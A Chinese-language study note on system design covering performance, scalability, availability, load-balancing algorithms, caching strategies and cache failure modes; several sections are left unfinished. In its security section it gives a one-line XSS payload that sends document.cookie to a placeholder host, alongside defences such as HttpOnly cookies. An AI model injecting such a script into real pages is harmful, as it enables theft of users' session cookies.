# 系统设计
<!-- GFM-TOC -->
* [系统设计基础](#系统设计基础)
    * [一、性能](#一、性能)
        * [性能指标](#性能指标)
        * [性能优化](#性能优化)
    * [二、可伸缩性](#二、可伸缩性)
    * [三、可扩展性](#三、可扩展性)
    * [四、可用性](#四、可用性)
	* [五、安全性](#五、安全性)
* [集群](#集群)
    * [负载均衡](#负载均衡)
    * [负载均衡算法](#负载均衡算法)
    * [转发实现](#转发实现)
* [缓存](#缓存)
    * [缓存特征](#缓存特征)
    * [淘汰策略（缓存替换算法）](#淘汰策略（缓存替换算法）)
    * [LRU](#lru)
    * [缓存位置](#缓存位置)
    * [缓存问题](#缓存问题)
        * [缓存穿透](#缓存穿透)
        * [缓存雪崩](#缓存雪崩)
        * [缓存一致性](#缓存一致性)
        * [缓存无底洞现象](#缓存无底洞现象)
* [高并发](#高并发)
<!-- GFM-TOC -->

## 系统设计基础
### 一、性能
#### 性能指标
1. 响应时间： 某个请求从发出到接收到响应消耗的时间。 测试响应时间可以采用重复请求的方式，然后计算平均响应时间。

2. 吞吐量： 系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。“吞”进去的是请求，“吐”出来的是结果。

3. 资源使用率： CPU 占用率、内存使用率、磁盘 I/O、网络 I/O。

4. 并发用户数： 系统能同时处理的并发用户请求数量。可以采用多线程处理并发请求，从而提高吞吐量并降低响应时间。

使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。

并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。

#### 性能优化
1. 集群
将多台服务器组成集群，使用**负载均衡**将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。

2. 缓存

3. 异步

### 二、可伸缩性
网站的可伸缩性是不改变网站的软硬件设计，仅通过改变部署的服务器数量就可以扩大或者缩小网站的服务处理能力。

可以通过负载均衡器向集群中添加新的服务器，来增强整个集群的处理能力。

如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。

### 三、可扩展性
可扩展性是软件系统应对需求增加或需求变化的能力。 添加新功能时对现有系统的其它应用无影响，要求不同应用具备低耦合的特点。

实现可扩展主要有两种方式：
1. 使用消息队列进行解耦，应用之间通过消息传递进行通信；
2. 使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。

### 四、可用性
可用性是系统无故障运行的时间占比。保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。

应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。

存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。

应用服务器和存储服务器？？？

### 五、安全性
1. SQL 注入攻击

2. 跨站脚本攻击 XSS
可以将代码注入到用户浏览的网页上，包括 HTML 和 JavaScript。
```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```
危害： 窃取用户的 Cookie、伪造虚假的输入表单骗取个人信息、显示伪造的文章或者图片

防范手段：
- 设置 Cookie 为 HttpOnly，可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息
- 过滤特殊字符

3. 跨站请求伪造 CSRF

4. 拒绝服务攻击 DoS，目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问


## 集群
将多台服务器组成集群，使用**负载均衡**将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。

### 负载均衡
集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。

运行过程：
1. 根据负载均衡算法得到转发的节点；
2. 进行转发

负载均衡器可以实现高可用及伸缩性：
- 高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；
- 伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。

### 负载均衡算法
1. 轮询： 轮询算法把每个请求轮流发送到每个服务器上，适用于每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那性能较差的服务器可能无法承担过大的负载

2. 加权轮询： 在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。
缺点： 由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。

3. 最少连接： 将请求发送给当前最少连接数的服务器上。

4. 加权最少连接： 在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。

5. 源地址哈希法 (IP Hash)：通过对客户端 IP 计算哈希值后，再对服务器数量取模得到目标服务器的序号。 保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话保持。

### 转发实现
常见互联网分布式架构如上，分为客户端层、反向代理 nginx 层、站点层、服务层、数据层。

每一个下游都有多个上游调用，只需要做到，每一个上游都均匀访问每一个下游，可以实现将请求/数据均匀分摊到多个操作单元上执行。

1. 客户端层 -> 反向代理层的负载均衡： 通过 DNS 轮询
2. 反向代理层 -> 站点层： nginx
3. 站点层 -> 服务层： 服务连接池
3. 服务层 -> 数据层： 需要考虑数据均衡、请求均衡两方面，常用方式有按范围水平切分和 hash 水平切分


## 缓存
缓存是可以进行高速数据交换的存储器，使用 RAM，内存中被 CPU 访问最频繁的数据和指令被复制入 CPU 中的缓存，缓存比内存的速度快得多。

- 缓存数据通常位于内存等介质中，这种介质对于读操作特别快；
- 缓存数据可以位于靠近用户的地理位置上；
- 可以将计算结果进行缓存，从而避免重复计算。

### 缓存特征
#### 命中率
当某个请求能够通过访问缓存而得到响应时，称为缓存命中。 缓存命中率越高，缓存的利用率也就越高。

#### 最大空间
缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。 当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。

### 淘汰策略（缓存替换算法）
1. FIFO 先进先出策略： 在实时性的场景下，需要经常访问最新的数据

2. LRU 最近最少使用策略： 优先淘汰最久未使用的数据，保证内存中的数据都是常被访问的数据，从而保证缓存命中率。

3. LFU 最不经常使用策略： 优先淘汰一段时间内使用次数最少的数据。

### LRU
LRU 最近最少使用，是一种常用的页面置换算法，选择最近最久未使用的页面予以淘汰。

实现： 基于双向链表 + HashMap
1. 用 HashMap 存储 key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除
2. HashMap 的 Value 指向双向链表实现的 LRU 的 Node 节点

访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。

HashMap 和双向链表实现，需要额外的存储存放 next 和 prev 指针，牺牲比较大的存储空间。
在 Redis 中采用了一个近似的做法来实现 LRU： 随机取出若干个 key，然后按照访问时间排序后，淘汰掉最不经常使用的。

### 缓存位置
#### 浏览器
当 HTTP 响应允许进行缓存时（Cache-Control ），浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。

#### 反向代理
反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。

#### 本地缓存
将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。

#### 分布式缓存
使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。

#### 数据库缓存
MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。

#### CPU 多级缓存
CPU 缓存通常分成了三个级别：L1，L2，L3。级别越小越接近CPU，速度越快，但容量越小。

在多核 CPU 中，每个核上都有一个 L1 缓存（其实是两个，一个存数据，一个存指令），一个 L2 缓存；
而同一个 CPU 插槽之间的核共享一个 L3 缓存。

获取数据时首先会在最快的缓存 L1 中找数据，如果缓存没有命中则往下一级找,直到三级缓存都找不到时，就向内存要数据。一次次地未命中，代表取数据消耗的时间越长。

### CDN
CDN 内容分发网络，是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将静态资源分发给用户。

优点：
1. 更快地将数据分发给用户；
2. 通过部署多台服务器，从而提高系统整体的带宽性能；
3. 多台服务器可以看成是一种冗余机制，从而具有高可用性。

### 缓存问题
#### 缓存穿透
缓存穿透是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。

解决方案： 对这些不存在的数据缓存一个空数据；对这类请求进行过滤

#### 缓存雪崩
缓存雪崩是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库，造成数据库崩溃。

解决方案：
1. 防止缓存在同一时间大面积过期： 通过观察用户行为，合理设置缓存过期时间来实现
2. 防止缓存服务器宕机： 使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。
3. 缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。

#### 缓存一致性
缓存一致性要求数据更新的同时缓存数据也能够实时更新。保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。

解决方案： 在数据更新的同时立即去更新缓存；在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。

#### 缓存无底洞现象
缓存无底洞是为了满足业务要求添加了大量缓存节点，但是性能不但没有好转反而下降了的现象。

随着缓存节点数目的增加，客户端一次批量操作会涉及多次网络操作，因此耗时增加，节点的性能也有一定的影响。


## 高并发
高并发是互联网分布式系统架构设计中必须考虑的因素之一，通常是指，通过设计保证系统能够同时并行处理很多请求。